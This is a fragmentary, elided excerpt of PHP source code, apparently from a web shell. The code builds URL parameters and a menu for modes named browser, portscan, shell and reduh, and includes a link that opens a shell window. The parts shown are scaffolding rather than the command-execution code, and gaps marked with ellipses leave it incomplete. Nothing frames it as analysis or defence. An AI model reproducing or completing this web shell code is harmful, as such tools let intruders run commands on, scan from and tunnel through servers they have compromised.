...
function build_params($p = array())
{
	...
	$script_tags = array('mode', 'portscan', 'shell', 'reduh', 'e', 'v', 's', 'd', 'l', 'r');
...
function _link($params = array())
{
	...
	{
		$t = explode('=', $val);
		if (!in_array($t[0], array_keys($params)) and !in_array($t[0], $script_tags))
			$ret .= $t[0] .'='. (isset($t[1]) ? $t[1] : '') .'&';
	}
...
if (MODE == 'browser')
{
	...
	echo '<p>'. ((MODE == 'browser' and !isset($_GET['portscan']) and !isset($_GET['reduh'])) ? 'browser' : 
		...
		(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. _link(array('mode' => 'shell')) .'\', \'\', \'width=850,height=440,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
